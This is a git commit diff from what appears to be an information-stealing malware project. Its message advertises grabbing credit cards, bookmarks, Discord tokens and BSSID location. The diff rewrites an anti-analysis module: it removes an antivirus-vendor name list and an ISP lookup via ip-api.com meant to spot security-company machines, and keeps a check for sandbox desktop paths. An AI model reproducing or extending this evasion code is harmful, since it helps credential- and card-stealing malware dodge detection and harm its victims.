33f0b2070f17ae0f47423073b2056e940160b59f
Bainky <61879874+Bainky@users.noreply.github.com>
2020-06-28 21:06:26 +0600

    • New Features!
    • Location by BSSID
    • Get CreditCards
    • Get Bookmarks
    • Discord Token

--- Core/Settings/Organization.py
+++ Core/Settings/Organization.py
@@ -1,54 +1,7 @@
 # Import modules
 
 import os
-from json import loads
-from urllib.request import urlopen
 
-
-# Organizations list (By Ip)
-
-OrganizationsIp = (
-    'microsoft',
-    'google',
-    'amazon',
-    'facebook',
-    'avast',
-    'avira',
-    'avg',
-    'vds',
-    'cisco',
-    'bitdefender',
-    'comodo',
-    'clamwin',
-    'dr.web',
-    'eset',
-    'grizzly',
-    'kaspersky',
-    'malware',
-    'norton',
-    'antivirus',
-    'security',
-    'secure',
-    'defender',
-    'zonealarm',
-    'immunet',
-    'check point',
-    'f-secure',
-    'f-prot',
-    'frisk',
-    'fortinet',
-    'g data',
-    'mcaffe',
-    'sophos',
-    'panda',
-    'qihoo',
-    'quick heal',
-    'trend micro',
-    'trustport',
-    'virusblokada',
-    'webroot',
-    'symantec',
-)
 
 # Organizations list (By Directories)
 
@@ -60,25 +13,7 @@ OrganizationsPaths = (
     'C:\\Users\\Jason\\Desktop')
 
 
-# Detect Antivirus organization by Ip
-
-def OrganizationIp(Ip=''):
- try:
-  result = urlopen(f'http://ip-api.com/json/{Ip}').read().decode('utf8')
- except:
-  pass
- else:
-  isp = loads(result)['isp'].lower()
-  for OrganizationIp in OrganizationsIp:
-   if isp in OrganizationIp:
-    return True
- return False
-
-
 # Detect Antivirus organization by Directories
 
-def OrganizationPaths():
- for OrganizationPaths in OrganizationsPaths:
-  if os.path.exists(OrganizationPaths):
-   return True
-  return False
+def Organization():
+    return any([os.path.exists(Organization) for Organization in OrganizationsPaths])
